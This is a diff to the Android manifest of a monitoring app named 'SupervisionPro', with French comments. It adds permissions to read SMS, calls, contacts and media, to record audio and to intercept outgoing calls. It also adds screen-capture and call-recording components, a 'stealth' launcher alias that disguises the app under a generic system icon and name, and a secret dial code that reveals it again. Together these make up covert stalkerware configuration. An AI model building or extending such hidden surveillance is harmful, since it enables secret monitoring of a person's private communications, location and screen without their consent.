@@ -2,22 +2,50 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- Permissions -->
+    <!-- Permissions de base -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+
+    <!-- GPS -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+
+    <!-- Services en arriere-plan -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+
+    <!-- Apps et usage -->
     <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
         tools:ignore="ProtectedPermissions" />
     <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
         tools:ignore="QueryAllPackagesPermission" />
+
+    <!-- Appels et SMS -->
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"
+        tools:ignore="ProtectedPermissions" />
+
+    <!-- Contacts -->
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+
+    <!-- Medias (photos, videos, galerie) -->
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+
+    <!-- Enregistrement audio (root: appels) -->
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
 
     <application
         android:allowBackup="false"
@@ -30,25 +58,61 @@
         android:theme="@style/Theme.SupervisionPro"
         android:usesCleartextTraffic="true">
 
-        <!-- Activite principale -->
+        <!-- Activite principale (pas dans le launcher directement) -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
             android:label="@string/app_name"
-            android:theme="@style/Theme.SupervisionPro">
+            android:theme="@style/Theme.SupervisionPro" />
+
+        <!-- Alias VISIBLE : icone normale dans le launcher (pour la configuration initiale) -->
+        <activity-alias
+            android:name=".LauncherVisible"
+            android:targetActivity=".MainActivity"
+            android:exported="true"
+            android:enabled="true"
+            android:label="@string/app_name_visible"
+            android:icon="@mipmap/ic_launcher"
+            android:roundIcon="@mipmap/ic_launcher_round">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
+        </activity-alias>
 
-        <!-- Service GPS en arriere-plan -->
+        <!-- Alias FURTIF : icone Android systeme, nom generique (apres configuration) -->
+        <activity-alias
+            android:name=".LauncherStealth"
+            android:targetActivity=".MainActivity"
+            android:exported="true"
+            android:enabled="false"
+            android:label="@string/app_name_stealth"
+            android:icon="@android:drawable/ic_menu_manage">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- Service GPS (continu + a la demande) -->
         <service
             android:name=".services.LocationService"
             android:foregroundServiceType="location"
             android:exported="false" />
 
-        <!-- Service de lecture des notifications (WhatsApp, SMS, etc.) -->
+        <!-- Service ContentObserver (SMS, appels, contacts en temps reel) -->
+        <service
+            android:name=".services.ContentObserverService"
+            android:foregroundServiceType="dataSync"
+            android:exported="false" />
+
+        <!-- Service capture d'ecran -->
+        <service
+            android:name=".services.ScreenCaptureService"
+            android:foregroundServiceType="mediaProjection"
+            android:exported="false" />
+
+        <!-- Listener de notifications (WhatsApp, SMS, Telegram...) -->
         <service
             android:name=".services.SupervisionNotificationListener"
             android:exported="true"
@@ -77,6 +141,27 @@
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Enregistrement d'appels (root) -->
+        <receiver
+            android:name=".root.CallRecorder"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE" />
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Code secret pour reafficher l'app : *#*#7378#*#* -->
+        <receiver
+            android:name=".receivers.SecretCodeReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE" />
+                <data android:scheme="android_secret_code" android:host="7378" />
             </intent-filter>
         </receiver>
 
